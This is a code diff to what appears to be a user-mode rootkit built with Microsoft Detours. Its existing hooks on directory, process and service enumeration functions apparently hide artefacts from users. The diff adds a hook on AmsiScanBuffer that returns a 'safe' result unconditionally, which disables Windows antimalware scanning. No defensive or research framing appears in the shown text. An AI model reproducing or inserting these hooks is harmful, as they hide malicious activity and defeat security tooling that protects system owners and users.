@@ -6,15 +6,19 @@ static typedefNtQueryDirectoryFile originalNtQueryDirectoryFile;
 static typedefNtQueryDirectoryFileEx originalNtQueryDirectoryFileEx;
 static typedefEnumServiceGroupW originalEnumServiceGroupW;
 static typedefEnumServicesStatusExW originalEnumServicesStatusExW;
+static typedefAmsiScanBuffer originalAmsiScanBuffer;
 
 BOOL StartHook() {
 	HMODULE ntdllHandle = GetModuleHandleA("ntdll.dll");
 	HMODULE advapi32Handle = GetModuleHandleA("Advapi32.dll");
+	HMODULE amsiHandle = GetModuleHandleA("amsi.dll");
 	originalNtQueryDirectoryFile = (typedefNtQueryDirectoryFile)GetProcAddress(ntdllHandle, "NtQueryDirectoryFile");
 	originalNtQueryDirectoryFileEx = (typedefNtQueryDirectoryFileEx)GetProcAddress(ntdllHandle, "NtQueryDirectoryFileEx");
 	originalNtQuerySystemInformation = (typedefNtQuerySystemInformation)GetProcAddress(ntdllHandle, "NtQuerySystemInformation");
 	originalEnumServiceGroupW = (typedefEnumServiceGroupW)GetProcAddress(advapi32Handle, "EnumServiceGroupW");
 	originalEnumServicesStatusExW = (typedefEnumServicesStatusExW)GetProcAddress(advapi32Handle, "EnumServicesStatusExW");
+	originalAmsiScanBuffer = (typedefAmsiScanBuffer)GetProcAddress(amsiHandle, "AmsiScanBuffer");
+
 
 	DetourRestoreAfterWith();
 	DetourTransactionBegin();
@@ -24,6 +28,7 @@ BOOL StartHook() {
 	DetourAttach(&(PVOID&)originalNtQuerySystemInformation, HookedNtQuerySystemInformation);
 	DetourAttach(&(PVOID&)originalEnumServiceGroupW, HookedEnumServiceGroupW);
 	DetourAttach(&(PVOID&)originalEnumServicesStatusExW, HookedEnumServicesStatusExW);
+	DetourAttach(&(PVOID&)originalAmsiScanBuffer, HookedAmsiScanBuffer);
 	LONG err = DetourTransactionCommit();
 
 	return 0;
@@ -39,6 +44,10 @@ BOOL StopHook() {
 	LONG err = DetourTransactionCommit();
 
 	return 0;
+}
+
+static HRESULT WINAPI HookedAmsiScanBuffer(HAMSICONTEXT context, void* buffer, ULONG length, const WCHAR* name, HAMSISESSION session, AMSI_RESULT* result) {
+	return AMSI_IS_SAFE;
 }
 
 static NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, LPVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, LPVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan) {
